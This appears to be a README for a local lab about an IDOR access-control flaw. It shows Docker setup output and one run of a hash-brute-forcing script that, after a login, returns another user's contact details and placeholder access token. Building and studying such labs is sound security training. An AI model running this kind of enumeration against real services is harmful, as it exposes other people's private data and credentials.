# Broken Access Controll - IDOR
## Build Environment

```bash
» docker compose up -d
[+] Running 9/9

 [... snip ...]

[+] Building 75.5s (19/19) FINISHED                                                                                                             docker:default

 [... snip ...]

[+] Running 6/6
 ✔ app                    Built                                                                                                                           0.0s 
 ✔ mysql_database         Built                                                                                                                           0.0s 
 ✔ Network idor_default   Created                                                                                                                         0.1s 
 ✔ Container redis-cache  Started                                                                                                                         0.4s 
 ✔ Container mysqlDB      Started                                                                                                                         0.4s 
 ✔ Container node-app     Started                                                                                                                         0.6s

» docker container ls
CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS         PORTS                                                  NAMES
97d68c7401e1   idor-app              "docker-entrypoint.s…"   4 minutes ago   Up 4 minutes   0.0.0.0:8081->3000/tcp, :::3000->3000/tcp              node-app
76c842d214f5   redis:latest          "docker-entrypoint.s…"   4 minutes ago   Up 4 minutes   0.0.0.0:6379->6379/tcp, :::6379->6379/tcp              redis-cache
c7740a77e815   idor-mysql_database   "docker-entrypoint.s…"   4 minutes ago   Up 4 minutes   0.0.0.0:3306->3306/tcp, :::3306->3306/tcp, 33060/tcp   mysqlDB

## rebuild stack if/when making changes
» docker compose up -d --build
```




```bash
» python3 genHashes.py -e "a@a" -p "a" -n "john doe" -y 2018
[+] Logged in successfully!
[*] Brute-forcing hashes for john doe for the year 2018...
[+] User request successful!
Response: {'first_name': 'john', 'last_name': 'doe', 'email': 'johndoe@gmail.com', 'phone_number': '+00112233445566778899', 'access_token': 'J0HN_SUP3R_S3CR37_4CC355_70K3N'}

```